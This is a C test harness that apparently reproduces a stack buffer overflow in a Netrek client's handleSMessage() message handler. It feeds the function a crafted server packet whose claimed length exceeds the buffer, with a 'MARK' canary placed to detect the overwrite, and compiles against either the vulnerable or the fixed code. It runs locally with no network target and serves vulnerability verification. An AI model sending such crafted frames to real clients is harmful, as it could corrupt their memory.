/* netrekcow2shell driver: verbatim handleSMessage() from short.c.
 *
 * Stubs only supply the globals and dmessage() sink that the verbatim
 * function needs.  The wire frame is a byte array cast to the pinned
 * struct mesg_s_spacket layout from packets.h; no socket or live target.
 */
#include <stdio.h>
#include <string.h>
#include <stddef.h>

#define MAXPLAYER 36
#define MINDIV 0x02
#define MTEAM  0x04
#define MALL   0x08

struct player { unsigned char p_team; unsigned char p_no; };
static struct player players[MAXPLAYER];
static struct player self_player;
static struct player *me = &self_player;
static char teamlet[] = {'I','F','R','X','K','X','X','X','O','X','X','X','X','X','X','A'};
static char shipnos[] = "SCDDCA BBAS SBGA AT";
static char *teamshort[16] = {"IND","FED","ROM","X","KLI","X","X","X","ORI",
                              "X","X","X","X","X","X","ALL"};
static int debug = 0;

static char g_out[256];
static int  g_outlen = -1;
void dmessage(char *message, unsigned char flags, unsigned char from,
              unsigned char to)
{
    (void)flags; (void)from; (void)to;
    strncpy(g_out, message, sizeof(g_out) - 1);
    g_out[sizeof(g_out) - 1] = 0;
    g_outlen = (int)strlen(g_out);
}

#include "mesg_struct.inc"
#if defined(FIXED_BUILD)
#include "hunk_fixed.inc"
#else
#include "hunk_vuln.inc"
#endif

static unsigned char frame[256];

int main(int argc, char **argv)
{
    int safe = (argc > 1 && strcmp(argv[1], "safe") == 0);
    int i;
    memset(frame, 0, sizeof(frame));
    frame[0] = 0;                 /* SP_S_MESSAGE */
    frame[1] = 0;                 /* default -> "ALL" branch */
    frame[2] = 0;                 /* m_recpt */
    frame[3] = 255;               /* m_from -> "GOD->" branch */
    if (safe) {
        frame[4] = 16;            /* length of whole packet */
        memcpy(&frame[5], "hello", 6);
    } else {
        frame[4] = 130;           /* server-claimed length */
        for (i = 0; i < 91; i++) frame[5 + i] = 'A';
        frame[5 + 91] = 'M';      /* lands at buf[100] */
        frame[5 + 92] = 'A';      /* buf[101] */
        frame[5 + 93] = 'R';      /* buf[102] */
        frame[5 + 94] = 'K';      /* buf[103] */
        for (i = 95; i < 120; i++) frame[5 + i] = 'B';
        frame[5 + 120] = 0;       /* 120-byte unterminated-in-struct body */
    }
    handleSMessage((struct mesg_s_spacket *)frame);
    printf("outlen=%d\n", g_outlen);
    printf("b99=%02x b100=%02x b101=%02x b102=%02x b103=%02x b128=%02x b129=%02x\n",
           (unsigned char)g_out[99], (unsigned char)g_out[100],
           (unsigned char)g_out[101], (unsigned char)g_out[102],
           (unsigned char)g_out[103], (unsigned char)g_out[128],
           (unsigned char)g_out[129]);
    return 0;
}
